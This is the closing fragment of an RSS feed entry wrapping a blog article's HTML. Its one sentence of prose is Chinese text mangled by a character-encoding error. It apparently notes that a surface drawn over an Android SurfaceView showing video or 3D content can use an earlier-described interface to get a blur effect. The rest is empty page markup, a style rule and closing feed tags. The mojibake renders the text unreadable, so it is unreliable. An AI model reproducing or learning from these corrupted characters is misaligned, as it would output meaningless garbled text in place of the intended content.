<p>æ¯”å¦‚ï¼šåœ¨ä¸€ä¸ªsurfaceViewä¸­æ˜¾ç¤ºè§†é¢‘æˆ–è€…3Dç”»é¢ï¼Œä¸Šé¢çš„surfaceä½¿ç”¨ä¸Šé¢çš„æ¥å£å°±å¯ä»¥å®ç°æ¨¡ç³Šæ•ˆæœã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>